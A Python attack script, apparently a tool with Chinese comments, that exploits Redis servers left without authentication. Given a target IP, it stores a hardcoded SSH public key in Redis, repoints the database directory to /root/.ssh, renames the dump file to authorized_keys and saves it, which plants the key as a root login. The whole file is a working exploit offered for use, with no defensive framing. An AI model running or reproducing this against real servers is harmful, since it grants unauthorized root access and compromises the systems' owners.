#!/usr/bin/env python3
# encoding:utf-8

import socket
import optparse
import redis

socket.setdefaulttimeout(0.5)  # 设置socker超时，单位秒
key_pub = '''
\r\n
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDBYBvJk2/4xXzyXBvTid0m/wXiu5CPkjB8Rv0kfSjc6V+Pz+ogVCPA+TntvJmZV8FeljEdJ63b2kmsHRm\
3TVqZB2TYyJ8Q1OdJ0Uryua7btQF4U/3vENnaFEzExsfFoANzq3V0kcYqnh9w7Qj02CcqIJikuLCIKisvHOaKEAfkMw== root@localhost.localdomain
\r\n
'''


class RedisBiuBiu:
    def __init__(self, ip, port=6379):
        self.ip = ip
        self.port = port

    def check_redis(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.connect((self.ip, self.port))
            return True
        except socket.SO_ERROR:
            return False
        finally:
            server.close()

    def run(self):
        if self.check_redis():
            r = redis.StrictRedis(host=self.ip, socket_timeout=0.5)
            try:
                key_info = r.set('key', key_pub)
                dir_info = r.config_set('dir', '/root/.ssh')
                if key_info and dir_info:
                    response = r.keys()
                    if response != b'OK':
                        r.config_set('dbfilename', 'authorized_keys')
                        r.save()
                        print("IP： %s Config Success" % self.ip)
                    else:
                        print("IP： %s Need Authorize" % self.ip)
            except redis.RedisError:
                print("IP： %s Check redis Failed" % self.ip)
        else:
            print("IP： %s Connection Failed" % self.ip)


if __name__ == '__main__':
    parse = optparse.OptionParser()
    parse.add_option('-H', '--host', default=None, help='IP地址  如： -H 127.0.0.1')
    options, args = parse.parse_args()
    if options.host is None:
        exit("主机地址不能为空，请输入-h 查看帮助")
    RedisBiuBiu(options.host).run()

